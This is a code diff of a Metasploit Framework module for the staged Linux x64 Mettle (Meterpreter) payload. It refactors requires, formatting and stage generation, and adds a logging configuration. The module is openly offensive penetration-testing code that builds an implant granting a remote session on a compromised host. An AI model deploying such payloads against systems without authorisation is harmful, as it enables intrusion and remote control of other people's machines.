@@ -3,28 +3,25 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/base/sessions/meterpreter_x64_linux'
-require 'msf/base/sessions/meterpreter_options'
-require 'msf/base/sessions/mettle_config'
 require 'rex/elfparsey'
 
 module MetasploitModule
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'          => 'Linux Mettle x64',
-        'Description'   => 'Inject the mettle server payload (staged)',
-        'Author'        => [
+        'Name' => 'Linux Mettle x64',
+        'Description' => 'Inject the mettle server payload (staged)',
+        'Author' => [
           'Brent Cook <bcook[at]rapid7.com>'
         ],
-        'Platform'      => 'Linux',
-        'Arch'          => ARCH_X64,
-        'License'       => MSF_LICENSE,
-        'Session'       => Msf::Sessions::Meterpreter_x64_Linux
+        'Platform' => 'Linux',
+        'Arch' => ARCH_X64,
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::Meterpreter_x64_Linux
       )
     )
   end
@@ -95,7 +92,10 @@ module MetasploitModule
   end
 
   def generate_stage(opts = {})
-    MetasploitPayloads::Mettle.new('x86_64-linux-musl',
-      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
+    config_opts = { scheme: 'tcp' }.merge(mettle_logging_config(opts))
+    MetasploitPayloads::Mettle.new(
+      'x86_64-linux-musl',
+      generate_config(opts.merge(config_opts))
+    ).to_binary :process_image
   end
 end
